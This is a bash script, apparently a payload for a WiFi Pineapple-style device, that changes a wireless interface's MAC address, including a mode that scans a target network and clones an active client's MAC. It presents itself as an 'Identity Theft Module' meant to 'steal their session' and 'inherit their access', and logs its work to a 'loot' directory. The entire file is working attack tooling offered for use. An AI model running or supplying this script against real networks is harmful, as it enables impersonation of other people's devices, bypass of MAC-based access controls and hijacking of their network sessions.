#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# MIMIC - MAC Identity Manipulation & Impersonation Controller
# Developed by: bad-antics
# 
# Clone any device on the network - become them, inherit their access
#═══════════════════════════════════════════════════════════════════════════════

source /mmc/nullsec/lib/nullsec-scanner.sh 2>/dev/null

LOOT_DIR="/mmc/nullsec/mimic"
mkdir -p "$LOOT_DIR"

PROMPT "    ╔╦╗╦╔╦╗╦╔═╗
    ║║║║║║║║║  
    ╩ ╩╩╩ ╩╩╚═╝
━━━━━━━━━━━━━━━━━━━━━━━━━
Identity Theft Module

Become anyone on
the network. Clone their
MAC, steal their session.

SHAPESHIFTER
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"

PROMPT "MIMIC MODES:

1. Clone Specific MAC
   (You choose)

2. Clone Active Client
   (Auto-detect)

3. MAC Randomizer
   (Fresh identity)

4. Vendor Spoof
   (Look like device)"

MODE=$(NUMBER_PICKER "Mode (1-4):" 2)
INTERFACE="wlan0"
ORIGINAL_MAC=$(cat /sys/class/net/$INTERFACE/address 2>/dev/null)

LOOT_FILE="$LOOT_DIR/mimic_$(date +%Y%m%d_%H%M%S).txt"
cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 MIMIC - Identity Change Log
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Original MAC: $ORIGINAL_MAC
 Mode: $MODE
 Started: $(date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF

# Vendor prefixes
declare -A VENDORS=(
    ["Apple"]="00:1A:2B"
    ["Samsung"]="00:26:37"
    ["Intel"]="00:1B:21"
    ["Microsoft"]="00:50:F2"
    ["Cisco"]="00:1A:A1"
    ["Google"]="F4:F5:D8"
    ["Amazon"]="00:FC:8B"
    ["Roku"]="B0:A7:37"
)

generate_random_mac() {
    printf '%02x:%02x:%02x:%02x:%02x:%02x\n' \
        $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
        $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256))
}

change_mac() {
    local NEW_MAC="$1"
    ifconfig $INTERFACE down
    ifconfig $INTERFACE hw ether "$NEW_MAC"
    ifconfig $INTERFACE up
    echo "[$(date)] Changed MAC to: $NEW_MAC" >> "$LOOT_FILE"
}

case $MODE in
    1) # Manual MAC entry
        TARGET_MAC=$(TEXT_PICKER "Enter MAC:" "XX:XX:XX:XX:XX:XX")
        if [[ "$TARGET_MAC" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            NEW_MAC="$TARGET_MAC"
        else
            ERROR_DIALOG "Invalid MAC format!"
            exit 1
        fi
        ;;
    2) # Clone active client
        LOG "Scanning for clients..."
        SPINNER_START "Finding active clients..."
        
        nullsec_select_target
        [ -z "$SELECTED_BSSID" ] && { ERROR_DIALOG "No target!"; exit 1; }
        
        nullsec_select_client
        NEW_MAC="$SELECTED_CLIENT"
        
        SPINNER_STOP
        [ -z "$NEW_MAC" ] && { ERROR_DIALOG "No client found!"; exit 1; }
        ;;
    3) # Random MAC
        NEW_MAC=$(generate_random_mac)
        ;;
    4) # Vendor spoof
        PROMPT "VENDOR LIST:
1. Apple
2. Samsung
3. Intel
4. Microsoft
5. Cisco
6. Google
7. Amazon
8. Roku"
        VENDOR_NUM=$(NUMBER_PICKER "Vendor (1-8):" 1)
        case $VENDOR_NUM in
            1) PREFIX="00:1A:2B" ;;
            2) PREFIX="00:26:37" ;;
            3) PREFIX="00:1B:21" ;;
            4) PREFIX="00:50:F2" ;;
            5) PREFIX="00:1A:A1" ;;
            6) PREFIX="F4:F5:D8" ;;
            7) PREFIX="00:FC:8B" ;;
            8) PREFIX="B0:A7:37" ;;
        esac
        SUFFIX=$(printf '%02x:%02x:%02x\n' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
        NEW_MAC="${PREFIX}:${SUFFIX}"
        ;;
esac

CONFIRMATION_DIALOG "TRANSFORM INTO:
$NEW_MAC

This will change
your MAC address.

Network will reset.

Proceed?"
[ $? -ne 0 ] && exit 0

LOG "Transforming..."
SPINNER_START "Changing identity..."

change_mac "$NEW_MAC"
sleep 2

SPINNER_STOP

CURRENT_MAC=$(cat /sys/class/net/$INTERFACE/address 2>/dev/null)

cat >> "$LOOT_FILE" << EOF
TRANSFORMATION COMPLETE
New MAC: $CURRENT_MAC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

if [ "$CURRENT_MAC" = "$NEW_MAC" ]; then
    PROMPT "MIMIC COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━━━
Identity changed!

Was: $ORIGINAL_MAC
Now: $CURRENT_MAC

You are now someone
else on the network.

To restore:
Run MIMIC again with
your original MAC.
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"
else
    ERROR_DIALOG "MAC change failed!
Current: $CURRENT_MAC"
fi
